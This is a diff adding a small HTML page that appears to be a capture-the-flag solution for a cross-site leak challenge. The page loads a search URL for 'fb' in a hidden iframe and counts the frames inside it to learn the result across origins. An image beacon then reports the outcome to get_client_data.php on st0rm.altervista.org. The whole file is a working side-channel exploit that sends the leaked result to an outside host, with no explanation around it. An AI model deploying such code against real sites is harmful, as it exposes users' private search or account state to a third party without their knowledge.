@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="generator" content="AlterVista - Editor HTML"/>
+  <title></title>
+</head>
+<body>
+
+<iframe id="frame_sol" src="http://web/search?query=fb" onload="solution()"></iframe>
+<img id="img" src=""/>
+
+<script>
+
+function solution() {
+  if (document.getElementById("frame_sol").contentWindow.frames.length != 0) {
+    console.log("succeeded!!");
+    document.getElementById("img").src = "http://st0rm.altervista.org/get_client_data.php?log=correct";
+  } else {
+    console.log("incorrect!!");
+    document.getElementById("img").src = "http://st0rm.altervista.org/get_client_data.php?log=incorrect";
+  }
+}
+
+</script>
+
+</body>
+</html>
